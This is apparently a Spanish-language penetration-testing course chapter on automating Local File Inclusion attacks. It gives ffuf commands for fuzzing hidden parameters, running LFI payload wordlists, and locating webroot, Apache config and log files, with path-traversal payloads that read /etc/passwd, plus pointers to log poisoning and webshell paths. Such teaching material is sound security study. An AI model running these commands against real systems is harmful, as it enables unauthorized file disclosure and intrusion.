
Aunque es fundamental comprender cómo funcionan los ataques LFI a bajo nivel —creación de payloads, bypasses, filtros, escalado a RCE, etc.— en muchos escenarios reales también necesitamos **agilidad**. Para eso existen técnicas y herramientas automáticas que permiten:

- Identificar parámetros vulnerables.
    
- Probar listas muy amplias de payloads.
    
- Buscar rutas de logs, configuraciones o webroots.
    
- Automatizar escaneos repetitivos.
    

Este capítulo explica **cómo combinar automatización y análisis manual**, sin perder el control del proceso (porque los payloads “milagro” rara vez funcionan en entornos protegidos).

---

# 🔎 **1. Fuzzing de Parámetros Ocultos**

En una aplicación, los formularios visibles suelen estar bien validados, pero existen **parámetros no expuestos al usuario** que sí pueden ser vulnerables (ej. `?path=`, `?file=`, `?lang=`, `?template=`, etc.).

Estos parámetros pueden encontrarse mediante **fuzzing**, enviando miles de posibles nombres de parámetros hasta detectar cuáles producen una respuesta distinta.

Ejemplo con **ffuf**:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:KEY \
     -u 'http://<IP>:<PORT>/index.php?KEY=value' \
     -fs 2150
```

Si aparece una respuesta distinta a la tamaño base → **parámetro potencialmente interesante**.

📌 **Idea clave:**  
Cualquier parámetro descubierto por fuzzing puede contener vulnerabilidades LFI, RCE, SQLi, SSTI, etc. No es exclusivo de LFI.

---

# 📚 **2. Uso de Wordlists LFI**

Aunque el método manual es más fiable, muchas veces es útil lanzar un escaneo rápido con una wordlist especializada para comprobar si algún payload típico funciona.

Una de las más útiles es **LFI-Jhaddix**, que incluye:

- rutas relativas profundas,
    
- variantes URL-encoded,
    
- bypasses con `%00`, null bytes, etc.,
    
- paths comunes de Linux y Windows.
    

Ejemplo:

```bash
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:PAY \
     -u "http://<IP>:<PORT>/index.php?language=PAY" \
     -fs 2287
```

Resultados típicos:

```
../../../../etc/passwd
..%2F..%2F..%2Fetc%2Fhosts
/%2e%2e/%2e%2e/etc/passwd
```

💡 **Apunte útil:**  
Cuando obtengas hits, revisa manualmente cada uno. La automatización detecta tamaño distinto, pero no valida contenido real.

---

# 🗂️ **3. Fuzzing de Archivos Clave del Servidor**

Durante un ataque LFI hay archivos críticos que pueden serte útiles:

- **Webroot real** (para localizar uploads, shells, etc.)
    
- **Logs** (para poisoning)
    
- **Archivos de configuración** (paths de logs, módulos activos, rutas internas)
    

Muchos pentesters se atascan porque no saben dónde está el webroot o los logs.

Aquí entra el fuzzing.

---

## 🔍 **3.1. Descubrir el Webroot**

A veces el LFI no llega con rutas relativas y necesitamos una ruta absoluta.

Podemos fuzzear posibles webroots comunes:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:DIR \
     -u "http://<IP>:<PORT>/index.php?language=../../../../DIR/index.php" \
     -fs 2287
```

Ejemplo de detección:

```
/var/www/html/   [Status: 200]
```

Con esto ya podrías buscar:

```
/var/www/html/uploads/shell.php
/var/www/html/images/avatar.png
/etc/… (si el servidor está chrooted)
```

---

## 🔍 **3.2. Descubrir Configuraciones y Logs**

Los archivos de configuración del servidor web son oro puro:

- muestran el **DocumentRoot**,
    
- contienen las rutas reales de **error.log** y **access.log**,
    
- indican si hay alias, redirecciones, módulos activos…
    

Con una wordlist más precisa:

```bash
ffuf -w ./LFI-WordList-Linux:FILE \
     -u "http://<IP>:<PORT>/index.php?language=../../../../FILE" \
     -fs 2287
```

Ejemplos típicos detectados:

```
/etc/hostname
/etc/apache2/apache2.conf
/etc/apache2/envvars
/etc/fstab
```

Leyendo `apache2.conf` encontramos algo así:

```
DocumentRoot /var/www/webapp
CustomLog ${APACHE_LOG_DIR}/access.log
```

Luego, en `envvars`:

```
export APACHE_LOG_DIR=/var/log/apache2
```

Con esto ya tienes rutas exactas para poisoning o para entender la arquitectura interna.

---

# 🛠️ **4. Herramientas Automáticas LFI**

Aunque no sustituyen al análisis manual, pueden ahorrar tiempo para validar cosas básicas:

|Herramienta|Características|
|---|---|
|**LFISuite**|Rutas, wrappers, fuzz de logs, detección básica|
|**LFiFreak**|Wordlists integradas y detección automática|
|**Liffy**|Payloads comunes, wrappers php://, filtros, etc|

⚠️ **Advertencia:**  
Muchos están escritos en **Python 2** y sin mantenimiento → fallos frecuentes.

Se recomienda usarlos solo como apoyo, nunca como sustituto del análisis manual.

---

# 🎯 **Conclusión del Módulo**

La automatización es una aliada potente para LFI, pero **no reemplaza** la comprensión del fallo. Lo ideal:

1. **Escanear rápido** parámetros y payloads comunes.
    
2. **Revisar manualmente** los resultados.
    
3. Usar fuzzing para localizar:
    
    - webroot,
        
    - logs,
        
    - configuraciones internas.
        
4. Combinar esto con técnicas avanzadas:
    
    - log poisoning,
        
    - session poisoning,
        
    - php:// wrappers,
        
    - filters (Base64, ROT13),
        
    - null byte bypasses (si el lenguaje lo permite).
        